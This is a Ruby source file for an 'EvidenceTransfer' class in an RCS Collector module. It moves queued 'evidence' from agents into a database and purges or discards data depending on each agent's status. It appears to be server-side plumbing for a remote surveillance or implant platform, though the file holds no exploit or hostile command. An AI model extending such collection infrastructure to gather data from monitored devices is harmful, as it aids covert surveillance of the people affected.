#
#  Evidence Transfer module for transferring evidence to the db
#

require_relative 'db.rb'
require_relative 'evidence_manager.rb'

# from RCS::Common
require 'rcs-common/trace'
require 'rcs-common/fixnum'
require 'rcs-common/symbolize'

# from system
require 'thread'

module RCS
module Collector

class EvidenceTransfer
  include Singleton
  include RCS::Tracer

  def start
    @threads = Hash.new
    @worker = Thread.new { self.work }
  end

  def work
    # infinite loop for working
    loop do
      # pass the control to other threads
      sleep 1

      # don't try to transfer if the db is down
      next unless DB.instance.connected?

      # for each instance get the ids we have and send them
      EvidenceManager.instance.instances.each do |instance|
        # one thread per instance, but check if an instance is already under processing
        @threads[instance] ||= Thread.new do
          begin

            # get all the ids of the evidence for this instance
            evidences = EvidenceManager.instance.evidence_ids(instance)

            # get the info from the instance
            info = EvidenceManager.instance.instance_info instance
            raise "Cannot read info for #{instance}" if info.nil?

            # compact the database if there are no evidence
            EvidenceManager.instance.compact(instance) if evidences.empty? and info['sync_status'] != EvidenceManager::SYNC_IN_PROGRESS

            # try to purge repositories that are too old (15 days)
            if Time.now.getutc.to_i - info['sync_time'] > 15*86400
              trace :info, "Auto purging old repo [#{instance}]"
              EvidenceManager.instance.purge(instance)
            end

            # only perform the job if we have something to transfer
            unless evidences.empty?

              # get the info from the instance
              info = EvidenceManager.instance.instance_info instance
              raise "Cannot read info for #{instance}" if info.nil?

              # make sure that the symbols are present
              # we are doing this hack since we are passing information taken from the store
              # and passing them as they were a session
              sess = info.symbolize

              # ask the database the id of the agent
              status, agent_id = DB.instance.agent_status(sess[:ident], sess[:instance], sess[:subtype])
              sess[:bid] = agent_id
              raise "agent _id cannot be ZERO" if agent_id == 0

              case status
                when DB::DELETED_AGENT, DB::NO_SUCH_AGENT, DB::CLOSED_AGENT
                  trace :info, "[#{instance}] has status (#{status}) deleting queued evidence"
                  while (id = evidences.shift)
                    EvidenceManager.instance.del_evidence(id, instance)
                  end
                when DB::QUEUED_AGENT, DB::UNKNOWN_AGENT
                  trace :warn, "[#{instance}] was queued, not transferring evidence"
                when DB::ACTIVE_AGENT
                  # update the status in the db if it was offline when syncing
                  DB.instance.sync_update sess, info['version'], info['user'], info['device'], info['source'], info['sync_time']

                  # transfer all the evidence
                  while (id = evidences.shift)
                    self.transfer instance, id, evidences.count
                  end
              end
            end
          rescue Exception => e
            trace :error, "Error processing evidences: #{e.message}"
            trace :error, e.backtrace
          ensure
            # job done, exit
            @threads[instance] = nil
            Thread.kill Thread.current
          end
        end
      end
    end
  end

  def transfer(instance, id, left)
    evidence = EvidenceManager.instance.get_evidence(id, instance)
    raise "evidence to be transferred is nil" if evidence.nil?

    # send and delete the evidence
    ret, error, action = DB.instance.send_evidence(instance, evidence)

    if ret then
      trace :info, "Evidence sent to db [#{instance}] #{evidence.size.to_s_bytes} - #{left} left to send"

      StatsManager.instance.add ev_output: 1, ev_output_size: evidence.size

      EvidenceManager.instance.del_evidence(id, instance) if action == :delete
    else
      trace :error, "Evidence NOT sent to db [#{instance}]: #{error}"
      EvidenceManager.instance.del_evidence(id, instance) if action == :delete
    end
    
  end

end
  
end #Collector::
end #RCS::